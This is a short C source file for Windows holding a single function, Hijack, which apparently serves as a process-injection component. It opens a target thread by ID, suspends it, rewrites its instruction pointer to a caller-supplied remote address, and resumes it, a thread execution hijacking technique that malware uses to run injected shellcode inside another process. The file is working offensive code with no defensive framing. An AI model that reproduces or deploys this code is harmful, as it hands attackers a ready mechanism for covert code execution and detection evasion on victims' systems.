#define WIN32_LEAN_AND_MEAN

#include <winnt.h> 
#include <stdio.h>
#include <windows.h>
#include <stdint.h>

#include "nt.h"

BOOL Hijack(LPVOID RemoteAddr, DWORD Thread) {

        HANDLE hThread = NULL;
        NTSTATUS Status;

        ULONG SCount = 0;
        CLIENT_ID cid = { 0 };
        CONTEXT ctx = { 0 };
        OBJECT_ATTRIBUTES oa = { sizeof(oa), NULL, NULL, 0, NULL, NULL };

        cid.UniqueThread = (HANDLE)(uintptr_t)Thread;
        cid.UniqueProcess = NULL;

    /////////////////////////////////////////////////

    Status = NtOpenT(
        &hThread,
        THREAD_ALL_ACCESS,
        &oa,
        &cid
    );

    if (Status != STATUS_SUCCESS || hThread == NULL) { return FALSE; }

    /////////////////////////////////////////////////

    Status = NtSuspend(hThread, &SCount);

    if (Status != STATUS_SUCCESS) {
        CloseHandle(hThread);
        return FALSE;
    }

    /////////////////////////////////////////////////

    ctx.ContextFlags = CONTEXT_FULL;
    Status = NtGetContext(hThread, &ctx);

    if (Status != STATUS_SUCCESS) {
        NtResume(hThread, &SCount);
        CloseHandle(hThread);
        return FALSE;
    }

    /////////////////////////////////////////////////

    #ifdef _WIN64
        ctx.Rip = (DWORD64)RemoteAddr;
    #else
        ctx.Eip = (DWORD)RemoteAddr;
    #endif

    /////////////////////////////////////////////////

    Status = NtSetContext(hThread, &ctx);

    if (Status != STATUS_SUCCESS) {
        NtResume(hThread, &SCount);
        CloseHandle(hThread);
        return FALSE;
    }

    /////////////////////////////////////////////////

    Status = NtResume(hThread, &SCount);
    if (Status != STATUS_SUCCESS) {
        CloseHandle(hThread);
        return FALSE;
    }

    /////////////////////////////////////////////////

    CloseHandle(hThread);
    return TRUE;
}
